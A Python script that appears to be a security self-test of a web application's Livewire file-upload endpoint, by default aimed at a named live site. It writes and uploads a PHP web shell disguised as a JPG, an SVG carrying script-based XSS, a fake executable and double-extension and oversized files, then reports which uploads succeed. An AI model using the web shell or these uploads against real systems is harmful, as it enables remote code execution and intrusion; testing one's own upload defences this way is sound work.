#!/usr/bin/env python3
"""
Test File Upload Vulnerabilities
Tests if malicious files can be uploaded (XSS, PHP shells, etc.)
"""

import requests
import time
import json
import tempfile
import os
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class FileUploadTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.results = []

    def log_result(self, test_name, success, details):
        """Log test result"""
        result = {
            'test': test_name,
            'success': success,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.results.append(result)

        status = f"{Fore.RED}VULNERABLE" if success else f"{Fore.GREEN}SECURE"
        print(f"[{status}{Style.RESET_ALL}] {test_name}")
        print(f"  └─ {details}\n")

    def test_php_shell_upload(self):
        """Test if PHP shell can be uploaded"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 1: PHP Shell Upload (disguised as JPG)")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        # Create PHP shell disguised as JPG
        with tempfile.NamedTemporaryFile(mode='w', suffix='.jpg', delete=False) as f:
            f.write('<?php system($_GET["cmd"]); ?>')
            php_shell = f.name

        try:
            print(f"Created test file: shell.php.jpg")
            print(f"Attempting upload to /livewire/upload-file...\n")

            with open(php_shell, 'rb') as f:
                response = requests.post(
                    f"{self.base_url}/livewire/upload-file",
                    files={'files[]': ('shell.php.jpg', f, 'image/jpeg')},
                    timeout=15
                )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}\n")

            # If upload succeeds (200), it's vulnerable
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    if 'paths' in response_data:
                        self.log_result(
                            "PHP Shell Upload",
                            True,
                            f"PHP file uploaded successfully! Paths: {response_data['paths']}"
                        )
                        return True
                except:
                    pass

                self.log_result(
                    "PHP Shell Upload",
                    True,
                    "File upload succeeded (no content validation!)"
                )
                return True
            else:
                self.log_result(
                    "PHP Shell Upload",
                    False,
                    "Upload blocked or failed"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("PHP Shell Upload", False, f"Error: {str(e)}")
            return False
        finally:
            os.unlink(php_shell)

    def test_svg_xss_upload(self):
        """Test if malicious SVG can be uploaded"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 2: SVG XSS Upload")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        # Create malicious SVG
        svg_content = '''<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
    <text x="0" y="15">XSS Test</text>
    <script>alert('XSS')</script>
</svg>'''

        with tempfile.NamedTemporaryFile(mode='w', suffix='.svg', delete=False) as f:
            f.write(svg_content)
            svg_file = f.name

        try:
            print(f"Created malicious SVG with embedded JavaScript")
            print(f"Attempting upload...\n")

            with open(svg_file, 'rb') as f:
                response = requests.post(
                    f"{self.base_url}/livewire/upload-file",
                    files={'files[]': ('xss.svg', f, 'image/svg+xml')},
                    timeout=15
                )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}\n")

            if response.status_code == 200:
                self.log_result(
                    "SVG XSS Upload",
                    True,
                    "Malicious SVG uploaded! Stored XSS possible"
                )
                return True
            else:
                self.log_result(
                    "SVG XSS Upload",
                    False,
                    "Upload blocked"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("SVG XSS Upload", False, f"Error: {str(e)}")
            return False
        finally:
            os.unlink(svg_file)

    def test_executable_upload(self):
        """Test if executable files can be uploaded"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 3: Executable File Upload")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        # Create fake executable
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.exe', delete=False) as f:
            f.write(b'MZ\x90\x00')  # PE header signature
            exe_file = f.name

        try:
            print(f"Created fake executable file")
            print(f"Attempting upload...\n")

            with open(exe_file, 'rb') as f:
                response = requests.post(
                    f"{self.base_url}/livewire/upload-file",
                    files={'files[]': ('malware.exe', f, 'application/octet-stream')},
                    timeout=15
                )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:300]}\n")

            if response.status_code == 200:
                self.log_result(
                    "Executable Upload",
                    True,
                    "Executable file uploaded! Malware distribution possible"
                )
                return True
            else:
                self.log_result(
                    "Executable Upload",
                    False,
                    "Upload blocked (correct)"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Executable Upload", False, f"Error: {str(e)}")
            return False
        finally:
            os.unlink(exe_file)

    def test_oversized_file_upload(self):
        """Test if oversized files are rejected"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 4: Oversized File Upload (20MB)")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        # Create 20MB file (exceeds 12MB limit)
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.jpg', delete=False) as f:
            f.write(b'\x00' * (20 * 1024 * 1024))  # 20MB of zeros
            large_file = f.name

        try:
            print(f"Created 20MB test file")
            print(f"Attempting upload (should be rejected)...\n")

            with open(large_file, 'rb') as f:
                response = requests.post(
                    f"{self.base_url}/livewire/upload-file",
                    files={'files[]': ('large.jpg', f, 'image/jpeg')},
                    timeout=30
                )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:300]}\n")

            # If upload succeeds, it's a problem (should reject oversized files)
            if response.status_code == 200:
                self.log_result(
                    "Oversized File Upload",
                    True,
                    "20MB file accepted (exceeds limit!)"
                )
                return True
            else:
                self.log_result(
                    "Oversized File Upload",
                    False,
                    "Oversized file rejected (correct)"
                )
                return False

        except Exception as e:
            print(f"{Fore.YELLOW}Error (likely timeout): {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Oversized File Upload", False, "Upload failed (timeout/error)")
            return False
        finally:
            os.unlink(large_file)

    def test_double_extension_upload(self):
        """Test if double extension files can bypass filters"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"TEST 5: Double Extension Upload (shell.php.jpg)")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        # Create file with double extension
        with tempfile.NamedTemporaryFile(mode='w', suffix='.php.jpg', delete=False) as f:
            f.write('<?php phpinfo(); ?>')
            double_ext = f.name

        try:
            print(f"Created file with double extension")
            print(f"Attempting upload...\n")

            with open(double_ext, 'rb') as f:
                response = requests.post(
                    f"{self.base_url}/livewire/upload-file",
                    files={'files[]': ('shell.php.jpg', f, 'image/jpeg')},
                    timeout=15
                )

            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:300]}\n")

            if response.status_code == 200:
                self.log_result(
                    "Double Extension Upload",
                    True,
                    "Double extension file uploaded (potential RCE)"
                )
                return True
            else:
                self.log_result(
                    "Double Extension Upload",
                    False,
                    "Upload blocked"
                )
                return False

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}\n")
            self.log_result("Double Extension Upload", False, f"Error: {str(e)}")
            return False
        finally:
            os.unlink(double_ext)

    def run_all_tests(self):
        """Run all file upload tests"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"FILE UPLOAD VULNERABILITY TESTS")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        print(f"Target: {self.base_url}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # Run tests
        self.test_php_shell_upload()
        time.sleep(1)

        self.test_svg_xss_upload()
        time.sleep(1)

        self.test_executable_upload()
        time.sleep(1)

        self.test_double_extension_upload()
        time.sleep(1)

        self.test_oversized_file_upload()

        # Summary
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"TEST SUMMARY")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        vulnerable_count = sum(1 for r in self.results if r['success'])
        total_count = len(self.results)

        print(f"Total Tests: {total_count}")
        print(f"Vulnerable: {Fore.RED}{vulnerable_count}{Style.RESET_ALL}")
        print(f"Secure: {Fore.GREEN}{total_count - vulnerable_count}{Style.RESET_ALL}\n")

        if vulnerable_count > 0:
            print(f"{Fore.RED}⚠️  CRITICAL: File upload vulnerabilities detected!{Style.RESET_ALL}")
            print(f"{Fore.RED}   Malicious files can be uploaded (XSS, RCE possible).{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.GREEN}✓ All file upload tests passed{Style.RESET_ALL}\n")

        return self.results

if __name__ == "__main__":
    import sys
    from dotenv import load_dotenv

    load_dotenv()

    base_url = os.getenv('BASE_URL', 'https://evenleads.com')

    if len(sys.argv) > 1:
        base_url = sys.argv[1]

    tester = FileUploadTester(base_url)
    results = tester.run_all_tests()

    with open('results_file_upload.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f"Results saved to: results_file_upload.json")
